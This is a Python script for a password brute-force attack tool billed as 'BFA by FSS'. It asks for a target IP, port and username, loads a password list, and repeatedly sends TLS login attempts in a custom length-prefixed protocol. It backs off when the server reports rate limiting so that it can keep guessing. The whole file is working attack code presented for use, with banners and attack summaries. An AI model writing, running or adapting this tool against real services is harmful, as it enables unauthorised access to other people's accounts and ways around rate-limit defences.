import logging
import socket
import ssl
import time
from colorama import Fore, init
import os
import signal
import sys
from art import *

os.system('cls' if os.name == 'nt' else 'clear')

MAX_RETRIES = 3
INITIAL_DELAY = 0.06
DELAY_INCREMENT = 2
RATE_LIMIT_ERROR_THRESHOLD = 1000
init(autoreset=True)

def signal_handler(sig, frame):
    print(f"\n{Fore.RED}You have interrupted the process {sig}. Exiting the program gracefully {frame}...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def header():
    print(f"{Fore.CYAN}{'*' * 80}")
    print(f"{Fore.CYAN}{'*' * 27} Welcome to BFA by FSS {'*' * 30}")
    print(f"{Fore.CYAN}{'*' * 80}\n")
    print(f"{Fore.YELLOW}Max Retries: {MAX_RETRIES}")
    print(f"{Fore.YELLOW}Initial Delay: {INITIAL_DELAY}s")
    print(f"{Fore.YELLOW}Delay Increment: {DELAY_INCREMENT}")
    print(f"{Fore.YELLOW}Rate Limit Error Threshold: {RATE_LIMIT_ERROR_THRESHOLD}\n")
    print(f"{Fore.CYAN}{'*' * 80}")

def brute_force(ip, port, username, pwd_list):
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    attempt_count = 1
    delay = INITIAL_DELAY
    rate_limit_errors = 0
    error_count = 0
    start_time = time.time()

    print(f"{Fore.GREEN}\nStarting Brute Force Attack on {ip}:{port}...\n")
    time.sleep(1)

    for password in pwd_list:
        retries = 0
        while retries < MAX_RETRIES:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((ip, port))
                    s = context.wrap_socket(s, server_hostname=ip)
                    initial_message = receive_message(s)

                    print(f"{Fore.CYAN}\n[INFO] Initial server message: {initial_message}")

                    send_login_attempt(s, username, password)
                    response = receive_message(s)

                    print(f"{Fore.YELLOW}\n[ATTACK] Attempt #{attempt_count} of {len(pwd_list)}: Response received: {response}")

                    if response == "True":
                        print(f"{Fore.GREEN}\n[SUCCESS] Password found: {password}")
                        print(text2art("Success"))
                        return

                    elif "client exceeded rate limit" in response.lower():
                        rate_limit_errors += 1
                        print(f"{Fore.YELLOW}\n[WARNING] Rate limit reached. Pausing...")

                        if rate_limit_errors > RATE_LIMIT_ERROR_THRESHOLD:
                            print(f"{Fore.RED}\n[ERROR] Rate limit exceeded. Increasing delay...")
                            delay *= DELAY_INCREMENT

                        time.sleep(delay)
                        break

                    else:
                        rate_limit_errors = 0
                        delay = INITIAL_DELAY
                        break

            except ssl.SSLError as e:
                logging.exception("SSL error occurred.")
                print(f"{Fore.RED}\n[ERROR] SSL error occurred: {e}.")
                print(f"{Fore.YELLOW}Suggestion: Check your SSL configurations and retry.")
                delay *= DELAY_INCREMENT
                retries += 1

            except ConnectionAbortedError as e:
                logging.exception("Connection was aborted.")
                print(f"{Fore.RED}\n[ERROR] Connection was aborted: {e}. Retrying...")
                delay *= DELAY_INCREMENT
                retries += 1

            except ConnectionError as e:
                logging.error(f"Connection error occurred: {e}. Server might be off. Exiting the program...")
                return

            except Exception as e:
                logging.exception("General error occurred.")
                print(f"{Fore.RED}\n[ERROR] Unexpected error occurred: {e}. Retrying...")
                delay *= DELAY_INCREMENT
                retries += 1
                error_count += 1

            finally:
                s.close()
                time.sleep(delay)

        attempt_count += 1

    print(f"{Fore.RED}\n[FINISHED] Attack finished without success.")
    print(text2art("Failure"))

    print(f"{Fore.CYAN}\n[SUMMARY] Attack Summary:")
    print(f"{Fore.CYAN}{'-' * 30}")
    print(f"{Fore.CYAN}Total Attempts: {attempt_count}")
    print(f"{Fore.CYAN}Total Errors: {error_count}")
    print(f"{Fore.CYAN}Duration of Attack: {time.time() - start_time} seconds")
    print(f"{Fore.CYAN}{'-' * 30}")

def send_login_attempt(sock, username, password):
    login_attempt = f"login,{username},{password}"
    login_attempt = login_attempt.encode('utf-8')
    login_attempt_length = len(login_attempt)
    send_length = login_attempt_length.to_bytes(4, 'big')
    sock.send(send_length)
    sock.send(login_attempt)

def is_valid_ipv4(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
    except socket.error:
        return False
    return True

def is_valid_port(port):
    if 0 < port < 65536:
        return True
    return False


def receive_message(sock):
    message_length_header = sock.recv(4)
    if not message_length_header:
        return ''
    message_length = int.from_bytes(message_length_header, 'big')
    message = b''
    bytes_received = 0
    while bytes_received < message_length:
        bytes_to_receive = min(1024, message_length - bytes_received)
        chunk = sock.recv(bytes_to_receive)
        if not chunk:
            break
        message += chunk
        bytes_received += len(chunk)
    return message.decode('utf-8')

def read_passwords(file_name, start_index=0):
    with open(file_name, "r") as file:
        passwords = [line.strip() for line in file.readlines()]
    return passwords[start_index:]


def start_prompt():
    print(f"""{Fore.LIGHTRED_EX}
▀█████████▄     ▄████████    ▄████████      ▀█████████▄  ▄██   ▄           ▄████████    ▄████████    ▄████████ 
  ███    ███   ███    ███   ███    ███        ███    ███ ███   ██▄        ███    ███   ███    ███   ███    ███ 
  ███    ███   ███    █▀    ███    ███        ███    ███ ███▄▄▄███        ███    █▀    ███    █▀    ███    █▀  
 ▄███▄▄▄██▀   ▄███▄▄▄       ███    ███       ▄███▄▄▄██▀  ▀▀▀▀▀▀███       ▄███▄▄▄       ███          ███        
▀▀███▀▀▀██▄  ▀▀███▀▀▀     ▀███████████      ▀▀███▀▀▀██▄  ▄██   ███      ▀▀███▀▀▀     ▀███████████ ▀███████████ 
  ███    ██▄   ███          ███    ███        ███    ██▄ ███   ███        ███                 ███          ███ 
  ███    ███   ███          ███    ███        ███    ███ ███   ███        ███           ▄█    ███    ▄█    ███ 
▄█████████▀    ███          ███    █▀       ▄█████████▀   ▀█████▀         ███         ▄████████▀   ▄████████▀                                                                                                                                                                                     
    """)
    start = input("Do you want to start the brute force attack? (y/n): ")
    return start.lower()


def loading_effect():
    frames = ['-', '\\', '|', '/']
    for i in range(20):
        print(f"{Fore.GREEN}Preparing to start Brute Force Attack... {frames[i%4]}")
        time.sleep(0.1)
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")


def main():
    header()
    start = start_prompt()
    if start == "y":
        ip = input(f"{Fore.GREEN}Enter target IP: ")
        if not is_valid_ipv4(ip):
            print(f"{Fore.RED}Invalid IP address...")
            return
        try:
            port = int(input(f"{Fore.GREEN}Enter target port: "))
            if not is_valid_port(port):
                print(f"{Fore.RED}Invalid PORT number...")
                return

        except ValueError:
            print(f"{Fore.RED}Invalid PORT number...")
            return
        username = input(f"{Fore.GREEN}Enter target username: ")

        start_index = int(input(f"{Fore.GREEN}Enter starting word index (0 to 99999): "))

        loading_effect()

        password_list = read_passwords("BFA_P", start_index)

        brute_force(ip, port, username, password_list)
    elif start == "n":
        print(f"{Fore.RED}Brute force attack canceled...")
        print(text2art("Goodbye!"))
    else:
        print(f"{Fore.RED}Invalid input...")


if __name__ == "__main__":
    main()
